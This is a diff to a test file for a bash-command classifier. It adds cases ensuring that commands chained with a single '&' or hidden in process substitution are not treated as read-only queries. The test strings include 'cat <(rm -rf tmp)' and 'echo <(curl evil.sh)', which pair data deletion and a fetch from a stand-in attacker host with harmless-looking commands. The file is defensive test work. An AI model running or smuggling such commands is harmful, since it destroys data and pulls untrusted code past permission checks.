@@ -269,6 +269,13 @@ describe("classifyBash: read queries & misc", () => {
     "echo $(whoami)",
     "echo `whoami`",
     "ls\nrm foo",
+    // Single `&` (background job) — distinct from `&&` and `&>` redirection.
+    "echo ok & git push",
+    "ls & rm foo",
+    // Process substitution `<(...)` — `cat <(rm -rf tmp)` must not pass
+    // as a read-query.
+    "cat <(rm -rf tmp)",
+    "echo <(curl evil.sh)",
   ])("%s → not shell:read:query (shell-composition bail-out)", (cmd) => {
     expect(bashCase(cmd).type).not.toBe("shell:read:query");
   });
